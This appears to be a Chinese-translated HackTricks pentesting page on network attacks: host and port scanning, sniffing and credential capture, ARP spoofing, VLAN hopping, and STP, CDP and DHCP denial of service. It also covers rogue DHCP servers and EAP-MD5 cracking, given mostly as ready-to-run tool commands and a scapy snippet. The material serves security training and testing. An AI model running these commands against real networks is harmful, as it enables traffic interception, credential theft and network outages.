# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## 从外部发现主机

这是一个关于如何从 **Internet** 找到 **响应的 IPs** 的 **简短章节**。\
在这种情况下，你有一些 **IPs 的范围**（可能甚至有好几个 **范围**），你只需要找出 **哪些 IPs 在响应**。

### ICMP

这是发现主机是否存活的 **最简单** 且 **最快速** 的方法。\
你可以尝试发送一些 **ICMP** 数据包并 **等待响应**。最简单的方式是发送一个 **echo request** 并等待响应。你可以使用简单的 `ping` 或使用 `fping` 针对 **ranges**。\
你也可以使用 **nmap** 发送其他类型的 ICMP 数据包（这可以绕过对常见 ICMP echo request-response 的过滤）。
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

通常会发现各类 ICMP 数据包被过滤。然后，检查 host 是否在线的唯一方法就是 **try to find open ports**。每个 host 有 **65535 ports**，所以如果你的 "big" scope，你 **不能** 测试每个 host 的 **每个 port** 是否开放，那会花费太多时间。\
那么，你需要一个 **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) 和一份 **更常用的 ports:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
你也可以使用 `nmap` 执行此步骤，但它较慢，而且 `nmap` 在识别在线主机方面存在一些问题。

### HTTP 端口发现

这只是一个用于 TCP 端口发现的步骤，当你想**专注于发现 HTTP** **services** 时很有用：
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

你也可以尝试检查是否有 **UDP port open**，以决定你是否应该 **pay more attention** 于一个 **host.** 由于 UDP services 通常对常规的空 UDP 探测包 **don't respond**（不会返回 **any data**），因此很难判断端口是被过滤还是开放。判断的最简单方法是发送与正在运行的服务相关的包，由于你不知道具体运行的是哪个服务，应根据端口号尝试最可能的服务：
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
之前提到的 nmap 命令行会在 **/24** 范围内的每台主机上测试 **top 1000 UDP ports**，但即便只有这些也会花费 **>20min**。如果需要 **最快的结果**，你可以使用 [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)：`./udp-proto-scanner.pl 199.66.11.53/24`。这会将这些 **UDP probes** 发送到它们的 **expected port**（对于 /24 范围，这只需 1 min）：_DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP 端口发现
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

这里有一份在撰写时涵盖所有已知 Wifi 攻击的良好指南：

{{#ref}}
../pentesting-wifi/
{{#endref}}

## 从内部发现 hosts

如果你在 network 内，首要想做的事情之一是 **发现其他 hosts**。根据你能/想产生的 **noise** 多寡，可以执行不同的操作：

### Passive

你可以使用这些工具在已连接的 network 中被动地发现 hosts：
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### 主动

请注意，[_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) 中提到的技术也可以**在此应用**.\
但是，由于你与其他主机处于**同一网络**，你可以做**更多事情**：
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

请注意，_Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) 中提到的技术也可以在这里**应用**。\
但是，既然你与其他主机处于**同一网络**，你可以做**更多事情**：

- If you **ping** a **subnet broadcast address** the ping should be arrive to **each host** and they could **respond** to **you**: `ping -b 10.10.5.255`
- Pinging the **network broadcast address** you could even find hosts inside **other subnets**: `ping -b 255.255.255.255`
- Use the `-PE`, `-PP`, `-PM` flags of `nmap`to perform host discovery sending respectively **ICMPv4 echo**, **timestamp**, and **subnet mask requests:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan 用于通过**网络消息**来**启动**计算机。用于启动计算机的 magic packet 只是一个包含 **MAC Dst** 的数据包，然后它在同一数据包内被**重复 16 次**。\
这类数据包通常通过 **ethernet 0x0842** 或 **UDP packet to port 9** 发送。\
如果未提供 **[MAC]**，数据包将发送到 **broadcast ethernet**（广播 MAC 将是被重复的那个）。
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## 扫描主机

一旦你发现了所有想要深入扫描的 IP（外部或内部），可以执行不同的操作。

### TCP

- **开放** 端口: _SYN --> SYN/ACK --> RST_
- **关闭** 端口: _SYN --> RST/ACK_
- **被过滤** 端口: _SYN --> \[没有响应]_
- **被过滤** 端口: _SYN --> ICMP 消息_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

有 2 种选项可以扫描 UDP 端口：

- 发送一个 **UDP packet**，并检查是否收到 _**ICMP unreachable**_ 响应以判断端口是否为 **closed**（在多种情况下 ICMP 会被 **filtered**，所以你不会收到端口是 **closed** 还是 **open** 的任何信息）。
- 发送 **formatted datagrams** 去触发 **service** 的响应（例如 DNS、DHCP、TFTP 等，详见 _nmap-payloads_）。如果你收到 **response**，则该端口为 **open**。

**Nmap** 将使用 "-sV" 把这两种选项 **mix both**（UDP scans 非常慢），但请注意 UDP scans 比 TCP scans 更慢：
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

SCTP (Stream Control Transmission Protocol) 旨在与 TCP (Transmission Control Protocol) 和 UDP (User Datagram Protocol) 一起使用。它的主要目的是促进电话数据在 IP 网络上的传输，借鉴了 Signaling System 7 (SS7) 中的许多可靠性特性。SCTP 是 SIGTRAN 协议族的核心组件，该协议族旨在将 SS7 信号通过 IP 网络传输。

多种操作系统（如 IBM AIX、Oracle Solaris、HP-UX、Linux、Cisco IOS 和 VxWorks）均提供对 SCTP 的支持，表明它在电信和网络领域被广泛接受并且非常有用。

nmap 为 SCTP 提供两种不同的扫描： _-sY_ 和 _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS 和 IPS 绕过


{{#ref}}
ids-evasion.md
{{#endref}}

### **更多 nmap 选项**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### 揭示内部 IP 地址

**配置错误的 routers、firewalls 和 network devices** 有时会在响应网络探测时使用 **非公网源地址**。可以使用 **tcpdump** 在测试期间识别从私有地址接收到的 packets。具体来说，在 **Kali Linux** 上，可以在可从公共 Internet 访问的 **eth2 interface** 上捕获 packets。需要注意的是，如果你的设置位于 **NAT** 或 **Firewall** 之后，此类 packets 很可能会被过滤掉。
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

通过 Sniffing，可以通过查看捕获的 frames and packets 来了解 IP ranges、subnet sizes、MAC addresses 和 hostnames 的详细信息。如果网络配置错误或 switching fabric 在承压时，攻击者可以通过 passive network sniffing 捕获敏感数据。

如果 switched Ethernet network 配置正确，你通常只会看到 broadcast frames 和发送到你 MAC address 的数据。

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
也可以通过 SSH 会话从远程机器捕获数据包，并使用 Wireshark 作为 GUI 实时查看。
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

显然。

### 捕获凭证

你可以使用像 [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) 这样的工具从 pcap 或实时接口解析凭证。

## 局域网攻击

### ARP spoofing

ARP Spoofing 是通过发送 gratuitous ARPResponses 来表明某台机器的 IP 对应我们的设备的 MAC。然后，受害者会修改 ARP 表，并且每当想要联系该被伪造的 IP 时，都会联系到我们的机器。

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

通过发送大量具有不同源 MAC 地址的数据包来使交换机的 CAM 表溢出。当 CAM 表满时，交换机会开始像集线器一样工作（广播所有流量）。
```bash
macof -i <interface>
```
在现代交换机中，这个漏洞已被修复。

### 802.1Q VLAN / DTP 攻击

#### 动态中继

The **Dynamic Trunking Protocol (DTP)** 是一个链路层协议，旨在实现一个自动中继系统，允许交换机自动选择端口进入 trunk 模式 (Trunk) 或 非 trunk 模式。部署 **DTP** 常被视为网络设计不佳的迹象，强调了仅在必要时手动配置中继并确保良好文档的重要性。

默认情况下，交换机端口被设置为以 Dynamic Auto 模式运行，这意味着当邻近交换机发起时，它们准备开始 trunking。安全问题出现在 pentester 或攻击者连接到交换机并发送 DTP Desirable frame，使端口进入 trunk 模式时。此操作使攻击者能够通过分析 STP 帧 来枚举 VLAN，并通过建立虚拟接口 绕过 VLAN 分段。

许多交换机默认启用 DTP，攻击者可借此模拟交换机行为，从而访问所有 VLAN 的流量。脚本 [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) 可用于监视接口，显示交换机当前是 Default、Trunk、Dynamic、Auto 还是 Access 模式——后者是唯一对 VLAN hopping attacks 免疫的配置。该工具用于评估交换机的易受攻击状态。

如果识别出网络存在此类漏洞，可以使用 _**Yersinia**_ 工具通过 DTP 协议“enable trunking”，从而观察来自所有 VLAN 的数据包。
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

要枚举 VLANs，也可以使用脚本 [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. **请**不要在任何情况下中断该脚本。它每三秒注入一次 DTP Desirable。**动态创建的 switch 上的 trunk 通道只存活五分钟。五分钟后，trunk 会掉线。**
```
sudo python3 DTPHijacking.py --interface eth0
```
我想指出，**Access/Desirable (0x03)** 表示 DTP 帧是 Desirable 类型，这会指示端口切换到 Trunk 模式。并且 **802.1Q/802.1Q (0xa5** 表示 **802.1Q** 封装类型。

通过分析 STP 帧，**我们了解到 VLAN 30 和 VLAN 60 的存在。**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### 针对特定 VLAN 的攻击

一旦你知道 VLAN IDs 和 IPs 值，你可以 **配置一个虚拟接口以攻击特定 VLAN**.\
如果 DHCP 不可用，则使用 _ifconfig_ 设置静态 IP 地址。
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

前面讨论的针对其他 VLAN 的、涉及 **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** 的攻击可以由该工具**自动执行**： [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

如果攻击者知道受害主机的 **MAC, IP and VLAN ID of the victim host**，他可以尝试对一个帧进行 **double tag a frame**（同时带上其本身的 VLAN 和受害者的 VLAN）并发送该数据包。由于 **victim won't be able to connect back** 给攻击者，**best option for the attacker is communicate via UDP**，可选择像 SNMP 这样能执行某些有趣操作的协议。

攻击者的另一个选择是发起对 **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim**（可能通过 internet）。然后，如果受害者向攻击者控制的第二台主机发送了数据包，攻击者就可以在该主机上嗅探到这些数据包。

![](<../../images/image (190).png>)

要执行此攻击可以使用 scapy： `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

如果你**能够访问你直接连接的 switch**，就有能力在网络内**bypass VLAN segmentation**。只需将端口**切换到 trunk 模式**（也称为 trunk），为目标 VLAN 的 ID 创建虚拟接口，并配置一个 IP 地址。你可以尝试动态请求地址（DHCP），也可以静态配置，视具体情况而定。


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN 绕过

在某些环境（例如 guest wireless networks）中，会实施**port isolation（也称为 private VLAN）** 设置以防止连接到同一无线接入点的客户端彼此直接通信。然而，已发现一种可以规避这些隔离措施的技术。该技术利用网络 ACL 的缺失或配置不当，使得 IP 包可以通过 router 被路由到同一网络上的另一个客户端。

该攻击通过构造一个**携带目标客户端 IP 但使用 router 的 MAC 的数据包**来执行。这会导致 router 错误地将数据包转发到目标客户端。此方法类似于 Double Tagging Attacks 中使用的方式，即利用能够控制的、对受害者可访问的主机来利用该安全缺陷。

**攻击的关键步骤：**

1. **构造数据包：** 特别构造一个数据包，包含目标客户端的 IP，但使用 router 的 MAC 地址。
2. **利用 router 行为：** 将该构造的数据包发送到 router，由于配置原因，router 将数据包重定向到目标客户端，从而绕过 private VLAN 设置提供的隔离。

### VTP 攻击

VTP (VLAN Trunking Protocol) 将 VLAN 管理集中化。它使用 revision numbers 来维护 VLAN 数据库的完整性；任何修改都会使该数字递增。switches 会采用具有更高 revision number 的配置，更新它们自己的 VLAN 数据库。

#### VTP Domain Roles

- **VTP Server：** 管理 VLAN——创建、删除、修改。它向域内成员广播 VTP announcements。
- **VTP Client：** 接收 VTP announcements 以同步其 VLAN 数据库。该角色被限制不能本地修改 VLAN 配置。
- **VTP Transparent：** 不参与 VTP 更新但会转发 VTP announcements。不受 VTP 攻击影响，其 revision number 始终为零。

#### VTP Advertisement Types

- **Summary Advertisement：** 由 VTP server 每 300 秒广播一次，携带域的基本信息。
- **Subset Advertisement：** 在 VLAN 配置更改后发送。
- **Advertisement Request：** 由 VTP client 发出以请求 Summary Advertisement，通常是在检测到更高的配置 revision number 时。

VTP 漏洞仅能通过 trunk ports 利用，因为 VTP announcements 仅在这些端口上传播。Post-DTP 攻击情形可能会转向 VTP。像 Yersinia 这样的工具可以辅助进行 VTP 攻击，目标是清除 VLAN 数据库，从而有效地破坏网络。

注意：此处讨论的是 VTP version 1 (VTPv1)。
```bash
yersinia -G # Launch Yersinia in graphical mode
```
在 Yersinia 的 graphical mode 中，选择 deleting all VTP vlans 选项以清除 VLAN 数据库。

### STP 攻击

**如果你无法在接口上捕获 BPDU 帧，成功进行 STP 攻击的可能性很低。**

#### **STP BPDU DoS**

发送大量 BPDUs TCP (Topology Change Notification) 或 Conf (the BPDUs that are sent when the topology is created) 会使交换机过载并停止正常工作。
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

当发送 TCP 时，switches 的 CAM table 会在 15s 内被清除。然后，如果你持续发送这类 packets，CAM table 将不断重置（或每 15segs 一次），当它重置时，switch 会表现得像 hub。
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

攻击者模拟一个 switch 的行为以成为网络的 STP root。然后，更多的数据会通过它。这在你连接到两个不同的 switch 时很有用。\
这通过发送 BPDUs CONF packets 来完成，声称 **priority** 值低于当前 root switch 的实际 **priority**。
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**如果攻击者连接到两台交换机，他可以成为新生成树的根节点，并且这些交换机之间的所有流量都会通过他** (将执行一个 MITM 攻击。)
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP 攻击

CISCO Discovery Protocol (CDP) 对于 CISCO 设备之间的通信至关重要，允许它们**相互识别并共享配置细节**。

#### 被动数据收集 <a href="#id-0e0f" id="id-0e0f"></a>

CDP 被配置为通过所有端口广播信息，这可能导致安全风险。攻击者在连接到交换机端口后，可能会部署像 **Wireshark**、**tcpdump** 或 **Yersinia** 这样的网络嗅探器。此类操作可能会暴露关于网络设备的敏感信息，包括其型号和运行的 Cisco IOS 版本。攻击者随后可能针对识别出的 Cisco IOS 版本中的特定漏洞发动攻击。

#### 诱发 CDP 表泛洪 <a href="#id-0d6a" id="id-0d6a"></a>

更具攻击性的方法是通过耗尽交换机的内存来发起 Denial of Service (DoS) 攻击，伪装成合法的 CISCO 设备。下面是使用 Yersinia（一款用于测试的网络工具）发起此类攻击的命令序列：
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
在此攻击期间，交换机的 CPU 和 CDP 邻居表会被严重占用，因资源过度消耗而通常称为 **“网络瘫痪”**。

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### VoIP 攻击与 VoIP Hopper 工具

VoIP 电话与 IoT 设备日益集成，提供例如通过特殊电话号码解锁门或控制恒温器等功能。然而，这种集成可能带来安全风险。

工具 [**voiphopper**](http://voiphopper.sourceforge.net) 被设计用于在多种环境（Cisco、Avaya、Nortel、Alcatel-Lucent）中模拟 VoIP 电话。它通过 CDP、DHCP、LLDP-MED 和 802.1Q ARP 等协议发现语音网络的 VLAN ID。

**VoIP Hopper** 提供三种用于 Cisco Discovery Protocol (CDP) 的模式：

1. **Sniff Mode** (`-c 0`)：分析网络数据包以识别 VLAN ID。
2. **Spoof Mode** (`-c 1`)：生成自定义数据包以模拟真实 VoIP 设备的包。
3. **Spoof with Pre-made Packet Mode** (`-c 2`)：发送与特定 Cisco IP 电话型号完全相同的包。

出于速度考虑首选第三种模式。它需要指定：

- 攻击者的网络接口（`-i` 参数）。
- 被模拟的 VoIP 设备名称（`-E` 参数），需符合 Cisco 命名格式（例如 SEP 后跟 MAC 地址）。

在企业环境中，为了模拟现有的 VoIP 设备，可以：

- 检查电话上的 MAC 标签。
- 在电话显示设置中查看型号信息。
- 将 VoIP 设备连接到笔记本，并使用 Wireshark 观察 CDP 请求。

在第三种模式下运行该工具的示例命令如下：
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP 攻击

#### 枚举
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**两种 DoS 类型** 可以针对 DHCP 服务器执行。第一个方法是 **模拟足够多的假主机以耗尽所有可能的 IP 地址**.\
此攻击只有在您能看到 DHCP 服务器的响应并完成协议 (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)) 时才会生效。例如，这在 **Wifi 网络中不可行**。

另一种针对 DHCP 执行 DoS 的方法是发送 **使用每个可能的 IP 作为源地址的 DHCP-RELEASE packet**。然后，服务器将认为所有人都已停止使用这些 IP。
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
A more automatic way of doing this is using the tool [DHCPing](https://github.com/kamorin/DHCPig)

你可以使用前面提到的 DoS attacks 来强制客户端在环境中获取新的租约，并耗尽合法服务器使其变得无响应。这样当合法设备尝试重新连接时，**你可以提供下一次攻击中提到的恶意值**。

#### 配置恶意值

可以使用位于 `/usr/share/responder/DHCP.py` 的 DHCP 脚本 来设置一个 rogue DHCP server。此方法对网络攻击很有用，例如通过将流量重定向到恶意服务器来 capture HTTP 流量和凭证。然而，设置 rogue gateway 的效果较差，因为它只允许捕获客户端的出站流量，会错过来自真实 gateway 的响应。相反，建议设置 rogue DNS 或 WPAD 服务器以获得更有效的攻击。

下面是配置 rogue DHCP server 的命令选项：

- **我们的 IP 地址（网关通告）**：Use `-i 10.0.0.100` 来将你的机器 IP 宣传为网关。
- **本地 DNS 域名**：可选，Use `-d example.org` 来设置本地 DNS 域名。
- **原始路由器/网关 IP**：Use `-r 10.0.0.1` 来指定合法路由器或网关的 IP 地址。
- **主 DNS 服务器 IP**：Use `-p 10.0.0.100` 将你控制的 rogue DNS 服务器的 IP 设置为主 DNS。
- **次要 DNS 服务器 IP**：可选，Use `-s 10.0.0.1` 来设置次要 DNS 服务器 IP。
- **本地网络子网掩码**：Use `-n 255.255.255.0` 来定义本地网络的子网掩码。
- **用于 DHCP 流量的接口**：Use `-I eth1` 在指定的网络接口上监听 DHCP 流量。
- **WPAD 配置地址**：Use `-w “http://10.0.0.100/wpad.dat”` 来设置 WPAD 配置地址，以协助拦截 web 流量。
- **伪造默认网关 IP**：包含 `-S` 来伪造默认 gateway IP。
- **响应所有 DHCP 请求**：包含 `-R` 使服务器响应所有 DHCP 请求，但要注意这会产生大量噪音并可能被检测到。

通过正确使用这些选项，可以建立一个 rogue DHCP server 来有效地拦截网络流量。
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP 攻击**

Here are some of the attack tactics that can be used against 802.1X implementations:

- 通过 EAP 进行 Active brute-force password grinding
- 利用畸形的 EAP 内容攻击 RADIUS server _\*\*_(exploits)
- EAP 消息捕获并进行 offline password cracking (EAP-MD5 and PEAP)
- 强制 EAP-MD5 authentication 以绕过 TLS certificate validation
- 在使用 hub 或类似设备进行认证时注入恶意网络流量

If the attacker if between the victim and the authentication server, he could try to degrade (if necessary) the authentication protocol to EAP-MD5 and capture the authentication attempt. Then, he could brute-force this using:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) 是一类网络协议，旨在**创建一个热备冗余路由系统**。使用 FHRP，可以将物理路由器组合成一个逻辑设备，从而提高容错性并帮助分配负载。

**Cisco Systems 工程师开发了两种 FHRP 协议：GLBP 和 HSRP。**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

已知存在三种版本的 Routing Information Protocol (RIP)：RIP、RIPv2 和 RIPng。RIP 和 RIPv2 通过 UDP 的端口 520 向对等体发送 datagram，而 RIPng 则通过 IPv6 multicast 将 datagram 广播到 UDP 端口 521。RIPv2 引入了对 MD5 认证的支持。另一方面，RIPng 不包含原生认证；它依赖于 IPv6 中可选的 IPsec AH 和 ESP 头。

- **RIP 和 RIPv2：** 通信通过 UDP datagram 的端口 520 进行。
- **RIPng：** 使用 UDP 端口 521，通过 IPv6 multicast 广播 datagram。

注意 RIPv2 支持 MD5 认证，而 RIPng 不包含原生认证，依赖于 IPv6 中的 IPsec AH 和 ESP 头。

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** 是一种动态路由协议。**它是一个距离向量协议。** 如果没有**认证**并且没有将接口配置为被动，**入侵者**可以干扰 EIGRP 路由并导致**路由表被投毒**。此外，EIGRP 网络（即自治系统）**是扁平的，没有任何分区划分**。如果**攻击者注入一条路由**，这条路由很可能会**在整个自治 EIGRP 系统中传播**。

要攻击 EIGRP 系统，需要**与合法的 EIGRP 路由器建立邻居关系**，这会打开许多可能性，从基础侦察到各种注入。

[**FRRouting**](https://frrouting.org/) 允许你实现一个支持 BGP、OSPF、EIGRP、RIP 等协议的**虚拟路由器**。你只需将其部署在攻击者的系统上，就可以在路由域中伪装成合法的路由器。


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) 具备拦截 EIGRP (Enhanced Interior Gateway Routing Protocol) 广播的能力。它还允许注入数据包，可用于修改路由配置。

### OSPF

在 Open Shortest Path First (OSPF) 协议中，**MD5 认证通常用于确保路由器之间的安全通信**。然而，这种安全措施可以被 Loki 和 John the Ripper 等工具破坏。这些工具能够捕获并破解 MD5 哈希，从而暴露认证密钥。一旦获取该密钥，就可以用它引入新的路由信息。用于配置路由参数和设置被破解密钥的分别是 _Injection_ 和 _Connection_ 选项卡。

- **捕获并破解 MD5 哈希：** 可以使用 Loki 和 John the Ripper 等工具。
- **配置路由参数：** 通过 _Injection_ 选项卡完成。
- **设置被破解的密钥：** 在 _Connection_ 选项卡中配置。

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above)：用于扫描网络流量并查找漏洞的工具
- 你可以在[**这里**](https://github.com/Sab0tag3d/MITM-cheatsheet)找到有关网络攻击的**更多信息**。

## **Spoofing**

攻击者通过发送伪造的 DHCP 响应，为网络中新加入的主机配置所有网络参数（GW、IP、DNS）。
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

参见[上一节](#arp-spoofing)。

### ICMPRedirect

